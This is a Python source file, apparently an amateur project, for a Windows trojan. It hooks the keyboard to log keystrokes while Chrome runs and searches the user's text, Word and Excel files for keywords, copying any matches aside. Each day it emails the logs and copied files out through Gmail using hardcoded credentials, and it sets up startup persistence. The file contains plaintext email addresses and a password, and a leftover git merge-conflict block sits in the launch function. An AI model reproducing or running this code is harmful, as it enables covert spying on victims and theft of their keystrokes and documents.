# -*- coding: UTF-8 -*-
__author__ = 'shimon'
import os
import pythoncom
import pyHook
import psutil
import time
import threading
import smtplib
import shutil
import mmap
import glob
import win32com.client as win32
import xlrd
import re
import pywintypes
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders

# import ctypes
# import win32api
# import win32con


class Log(object):
    """Contains the log methods for the horse"""
    def __init__(self):
        create_file = open(Constants.LOG_FILE_LOCATION, Constants.APPEND_MODE)
        create_file.write("Log Constructor called\n")
        create_file.close()

    def writeMessage(self, message):
        if self.logSizeUnder1MB(Constants.LOG_FILE_LOCATION):
            f = open(Constants.LOG_FILE_LOCATION, Constants.APPEND_MODE)
            f.writelines(message)
            f.close()
        else:
            email_controller = AttachMail()
            email_controller.start_server()
            email_controller.sendMail(Constants.EMAIL_DESTINATION_LIST, "Log File Attached",
                                      "Sent from your friend...", Constants.LOG_FILE_LOCATION)
            email_controller.stop_server()
            self.clearLog()

    def logSizeUnder1MB(self, location):
        """Returns true if the size of the log file is less than 1MB"""
        if os.stat(location).st_size < Constants.MAX_LOG_SIZE:
            return True
        return False

    def clearLog(self):
        f = open(Constants.LOG_FILE_LOCATION, Constants.OVERWRITE_MODE)
        f.writelines("")
        f.close()


class KeyLogger(object):
    """Contains methods for starting and using keylogger"""
    def __init__(self):
        self.log_controller = Log()
        self.log_controller.writeMessage("Keylogger Constructor called\n")
        self.should_keylogger_stop = False
        self.send_keylog_flag = True
        create_file = open(Constants.KEY_STROKES_LOG, Constants.OVERWRITE_MODE)
        create_file.write("Key Stroke Log created:\n")
        create_file.close()

    def writetokeystrokelog(self, message):
        f = open(Constants.KEY_STROKES_LOG, Constants.APPEND_MODE)
        f.writelines(message)
        f.close()

    def clearkeystrokelog(self):
        f = open(Constants.KEY_STROKES_LOG, Constants.OVERWRITE_MODE)
        f.writelines("")
        f.close()

    def startKeyLogger(self):
        log_message = "Started keylogger\n"
        self.log_controller.writeMessage(log_message)
        hm = pyHook.HookManager()
        hm.KeyDown = self.OnKeyboardEvent
        hm.HookKeyboard()
        while not self.should_keylogger_stop:
            pythoncom.PumpWaitingMessages()

        self.log_controller.writeMessage("Confirmation of Keylogger termination\n")

    def send_keylog(self):
        while self.send_keylog_flag is True:
            time.sleep(86400)
            try:
                email_controller = AttachMail()
                email_controller.start_server()
                email_controller.sendMail(Constants.EMAIL_DESTINATION_LIST, "KeyLog File Attached",
                                          "Sent from your friend...", Constants.KEY_STROKES_LOG)
                email_controller.stop_server()
                self.clearkeystrokelog()
            except:
                pass

    def stop_to_send_keylog(self):
        time.sleep(2592000) #Wait for a month
        self.send_keylog_flag = False

    def OnKeyboardEvent(self, event):
        # print ("The message name is:",event.MessageName)
        # print("The Ascii is ", chr(event.Ascii))
        self.writetokeystrokelog(chr(event.Ascii))

        # Passes event on to the other handlers
        return True

    def stopkeylogger(self):
        # Let the keylogger run for seconds
        while not self.should_keylogger_stop:
            time.sleep(50)
            self.should_keylogger_stop = not self.isChromeRunning()
            if self.should_keylogger_stop is True:
                self.log_controller.writeMessage("Switched should_keylogger_stop flag to True\n")

        # log_message = "Posting message on thread ", str(self.running_keylogger_thread_id), "\n"
        # self.log_controller.writeMessage(log_message)
        # ctypes.windll.user32.PostQuitMessage(0)
        # win32api.PostThreadMessage(self.running_keylogger_thread_id, win32con.WM_QUIT, 0, 0)

    def isChromeRunning(self):
        log_message = """Checked if Chrome was running\n"""
        self.log_controller.writeMessage(log_message)
        for process in psutil.process_iter():
            try:
                if process.name() == Constants.CHROME_PROCESS_NAME:
                    log_message = """Chrome seems to be running\n"""
                    self.log_controller.writeMessage(log_message)
                    return True
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass
        log_message = """Chrome does not seem to be running\n"""
        self.log_controller.writeMessage(log_message)
        return False


class Constants(object):
    """Contains the Constants for the horse"""
    USER_NAME = os.getlogin()
    USER_PATH = r'C:\Users' + "\\" + USER_NAME
    SEARCH_ROOT = USER_PATH #+ r"\Documents"
    ROOT = r"C:"
    LOG_FILE_LOCATION = os.path.join(USER_PATH, r"Documents\tlog.txt")
    APPEND_MODE = 'a'
    OVERWRITE_MODE = 'w'
    READ_MODE = 'r'
    MAX_LOG_SIZE = 1000000
    WORD_LIST = ["shimon", "with"]
    DESTINATION_FOLDER_PATH = USER_PATH + r"\Documents\test"
    CHROME_PROCESS_NAME = "chrome.exe"
    ENDLINE = "\n"
    KEY_STROKES_LOG = os.path.join(USER_PATH, r"Documents\kslog.txt")
    EMAIL_SERVER_NAME = 'smtp.gmail.com:587'
    EMAIL_SOURCE = "trojanhorsepy@gmail.com"
    EMAIL_DESTINATION_LIST = ['nassanpaul@gmail.com', 'shimonste@gmail.com']
    EMAIL_CC_LIST = []
    EMAIL_SUBJECT_HEADER = "t..."
    EMAIL_LOGIN = "trojanhorsepy@gmail.com"
    EMAIL_PASSWORD = "nattanshimon"
    STARTUP_LOCATION = USER_PATH + r"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
    FIRST_TIME = "FIRSTtime.txt"
    FIRST_TIME_DIR = USER_PATH + r"\Documents\tks"
    FIRST_TIME_ALL_DIR = os.path.join(FIRST_TIME_DIR, FIRST_TIME)
    SELF_lOCATION = os.path.abspath(__file__)
    PYTHON_DEFAULT_LOCATION = ""


class OSmanipulation(object):
    """Contains methods for OSmanipulation:
    Things like copying files and searching files
    for text patterns, etc."""
    def __init__(self):
        self.log_controller = Log()
        self.continue_checking_flag = True
        if not os.path.exists(Constants.DESTINATION_FOLDER_PATH):
            os.makedirs(Constants.DESTINATION_FOLDER_PATH)

    def check(self, path, search_term):
        f = open(path, Constants.READ_MODE)
        for word in f:
            if search_term in word:
                f.close()
                return True

    def doesExist(self):
        list_of_existing_files = []
        f = open(Constants.FILE_LIST_PATH, Constants.READ_MODE)
        for file_name in f:
            for root, dirs, files in os.walk(Constants.SEARCH_ROOT):
                        if file_name.strip() in dirs:
                            list_of_existing_files.append(file_name)
                        if file_name.strip() in files:
                            list_of_existing_files.append(file_name)
        f.close()
        return list_of_existing_files

    def erase_old_files(self):
        if Constants.FIRST_TIME in os.listdir(Constants.FIRST_TIME_DIR):
            for root, dirs, files in os.walk(Constants.DESTINATION_FOLDER_PATH):
        
                for each in files:
                    temp=str(each)
                    temp=os.path.join(root,temp)
                    if os.stat(temp).st_mtime<os.stat(Constants.FIRST_TIME_ALL_DIR).st_mtime:
                        os.remove(temp)
            f = open(Constants.FIRST_TIME_ALL_DIR,'w')
            f.write("a")
            f.close()            
        else:
            f = open(Constants.FIRST_TIME_ALL_DIR,'w')
            f.close()

    def Copy_interesting_files(self):
        while self.continue_checking_flag is True:
            #time.sleep(86400)
            try:
                for root, dirs, files in os.walk(Constants.SEARCH_ROOT):
                    print(1)
                    for each in files:
                        if each.endswith('txt'):
                            temp=str(each)
                            temp=os.path.join(root,temp)
                            try:
                                file_to_check = open(temp)
                                wordList = Constants.WORD_LIST
                                check = False
                                for word in wordList:
                                    try:
                                         #if word.strip() in file_to_check:
                                         #   check=True
                                        s = mmap.mmap(file_to_check.fileno(), 0, access=mmap.ACCESS_READ)
                                        if s.find(word.encode()) != -1:
                                            check = True
                                    except UnicodeDecodeError and ValueError:
                                        pass
                                if check:
                                    shutil.copy2(temp, Constants.DESTINATION_FOLDER_PATH)
                                file_to_check.close()
                            except IOError:
                                pass

                        if each.endswith('docx'):
                            temp = str(each)
                            temp = os.path.join(root, temp)
                            #s = "אלגוריתם"
                            for s in Constants.WORD_LIST:
                                word = win32.gencache.EnsureDispatch('Word.Application')
                                word.Visible = False
                                z = s.encode()
                                #check=False
                                for infile in glob.glob(temp):
                                    check = False
                                    try:
                                        doc = word.Documents.Open(infile)
                                        for word_t in doc.Words:
                                            if str(z) in str(str(word_t).encode()).replace(" ", ""):
                                                check = True
                                        doc.Close()
                                        if check:
                                            shutil.copy2(temp, Constants.DESTINATION_FOLDER_PATH)
        
                                    except Exception:
                                        pass
                        if each.endswith('xlsx'):
                            #try:
                            for s in Constants.WORD_LIST:
                                word = str(str(s).encode())
                                temp = str(each)
                                temp = os.path.join(root, temp)
                                #print(word)
                                try:
                                    workbook = xlrd.open_workbook(temp)
                                    na=workbook.sheet_names()
                                    na[0].replace(" ", "")
                                    #print(na)
                                    for a in na:
                                        worksheet = workbook.sheet_by_name(str(a))
                                        num_rows = worksheet.nrows - 1
                                        num_cells = worksheet.ncols - 1
                                        curr_row = -1
                                        while curr_row < num_rows:
                                                curr_row += 1
                                                row = worksheet.row(curr_row)
                                                curr_cell = -1
                                                while curr_cell < num_cells:
                                                        check = False
                                                        curr_cell += 1
                                                        # Cell Types: 0=Empty, 1=Text, 2=Number, 3=Date, 4=Boolean, 5=Error, 6=Blank
                                                        cell_type = worksheet.cell_type(curr_row, curr_cell)
                                                        cell_value = worksheet.cell_value(curr_row, curr_cell)
                                                        #print(cell_value)
                                                        cell_value = str(cell_value).replace(" ", "")
                                                        cell_value = cell_value.lower()
        
                                                        if str(str(cell_value).encode())in word:
                                                            check = True
                                                        cell_value = str(str(cell_value).encode())
                                                        arra = [(a.start(), a.end()) for a in list(re.finditer(word, cell_value))]
                                                        if len(arra) >= 1:
                                                            check = True
                                                        if check:
                                                            shutil.copy2(temp, Constants.DESTINATION_FOLDER_PATH)
                                except Exception:
                                    pass
            except:
                pass                

    def stop_copying(self):
        time.sleep(2592000)
        self.continue_checking_flag = False

    def exucuteFunction(self, file_path):
        # We need to decide whether to add a file_path to the Constants
        opened_file = open(file_path, Constants.READ_MODE)
        content = opened_file.read()

        # Create a list from the comma-separated content in the file
        content_list = content.split(',')
        if content_list[0] == "check":
            print(self.check(content_list[1], content_list[2]))

        elif content_list[0] == "doesExist":
            print(self.doesExist(content_list[1], content_list[2]))


class Email(object):

    def __init__(self):
        self.header = 'From: %s\n' % Constants.EMAIL_SOURCE
        self.header += 'To: %s\n' % ','.join(Constants.EMAIL_DESTINATION_LIST[1])
        self.header += 'Cc: %s\n' % ','.join(Constants.EMAIL_CC_LIST)
        self.header += 'Subject: %s\n\n' % Constants.EMAIL_SUBJECT_HEADER
        self.server = smtplib.SMTP(Constants.EMAIL_SERVER_NAME)
        self.log_controller = Log()
        self.log_controller.writeMessage("Email object instantiated")

    def startserver(self):
        self.server.starttls()
        self.log_controller.writeMessage("email server is now UP")
        self.server.login(Constants.EMAIL_LOGIN, Constants.EMAIL_PASSWORD)
        self.log_controller.writeMessage("Successfully logged into email server")

    def stopserver(self):
        self.server.quit()
        self.log_controller.writeMessage("email server is now DOWN")

    def sendemail(self, body):
        self.server.sendmail(Constants.EMAIL_SOURCE, Constants.EMAIL_DESTINATION_LIST, self.header + body)


class AttachMail():

    def start_server(self):
        self.mailServer = smtplib.SMTP("smtp.gmail.com", 587)
        #mailServer = smtplib.SMTP_SSL("smtp.gmail.com", 465)   # didn't work for me
        self.mailServer.ehlo()
        self.mailServer.starttls()
        self.mailServer.ehlo()
        self.mailServer.login(Constants.EMAIL_LOGIN, Constants.EMAIL_PASSWORD)

    def stop_server(self):
        self.mailServer.close()

    def sendMail(self, to, subject, text, attach):
        try:
            msg = MIMEMultipart()
      
            msg['From'] = Constants.EMAIL_LOGIN
            msg['To'] = to
            msg['Subject'] = subject
          
            msg.attach(MIMEText(text))
          
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(open(attach, 'rb').read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition',
                    'attachment; filename="%s"' % os.path.basename(attach))
            msg.attach(part)
            self.mailServer.sendmail(Constants.EMAIL_LOGIN, to, msg.as_string())
        except:
            pass
    def sendMailInFolder(self):
        while True:
            try:
                time.sleep(86400)
                del_old_files=OSmanipulation()
                del_old_files.erase_old_files()
                self.start_server()
                for root, dirs, files in os.walk(Constants.DESTINATION_FOLDER_PATH):
                    for each in files:
                        temp=str(each)
                        temp=os.path.join(root,temp)
                        self.sendMail(Constants.EMAIL_DESTINATION_LIST,"python","python",temp)
                self.stop_server()
            except:
                pass
# Wasn't working out for us
def add_self_to_startup():
    # Check if program is in startup
    # If not, add it
    log_controller = Log()

    if 'test.lnk' not in os.listdir(Constants.STARTUP_LOCATION):
        test_path = os.listdir(r"C:\\")
        for x in range(36, 22, -1):
            version = "Python" + str(x)
            print(version)
            if version in test_path:
                Constants.PYTHON_DEFAULT_PATH = os.path.join(Constants.ROOT, "Python" + str(x))
                Constants.PYTHON_DEFAULT_PATH = os.path.join(Constants.PYTHON_DEFAULT_PATH, "python.exe")
                break

        ws = win32.Dispatch("wscript.shell")
        scut = ws.CreateShortcut(Constants.STARTUP_LOCATION + r"\test.lnk")
        scut.TargetPath = Constants.PYTHON_DEFAULT_PATH
        scut.Arguments = os.path.join("\"" + Constants.SELF_lOCATION, "trojan_horse.py" + "\"")
        scut.Save()
        log_controller.writeMessage("Added shortcut to startup menu")
    else:
        log_controller.writeMessage("Shortcut ALREADY to startup menu")


def kickOff():

    # Create the Keylogger object
    keylogger = KeyLogger()

    # Define the threads for the keylogger
    start_keylogger_thread = threading.Thread(target=keylogger.startKeyLogger)
    stop_timer = threading.Thread(target=keylogger.stopkeylogger)
    keylogger_mail_thread = threading.Thread(target=keylogger.send_keylog)
    stop_keylogger_mail_thread = threading.Thread(target=keylogger.stop_to_send_keylog)


    # Create the OSmanipulation object for copying interesting files
    file_copy = OSmanipulation()

    # Define the threads for the keylogger
    searching_thread = threading.Thread(target=file_copy.Copy_interesting_files)
    stop_searching_thread = threading.Thread(target=file_copy.stop_copying)

    # Create the email object
    attachmail = AttachMail()

    # Define email thread
    email_thread = threading.Thread(target=attachmail.sendMailInFolder)


    # Start the threads for the keylogger
    start_keylogger_thread.start()
    stop_timer.start()
    keylogger_mail_thread.start()
    stop_keylogger_mail_thread.start()

<<<<<<< HEAD



    #Start the threads for emailing
    # Start the threads for file copy
    searching_thread.start()
    stop_searching_thread.start()

    # Start the threads for emailing

=======
    #Start the threads for file copy
    searching_thread.start()
    stop_searching_thread.start()

    # Start the threads for emailing
>>>>>>> origin/master
    email_thread.start()
    


def email_test():
    email_controller = Email()
    email_controller.startserver()
    email_controller.sendemail("Hello from ")
    email_controller.stopserver()

# import winreg
# key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
#                      'Software\Microsoft\Windows\CurrentVersion\Run',
#                      winreg.KEY_SET_VALUE)
# winreg.SetValueEx(key, 'Trojan', 0, winreg.REG_SZ, Constants.SELF_lOCATION)
#kickOff()
if __name__ == "__main__":
    # call your code here
    kickOff()
    # email_test()

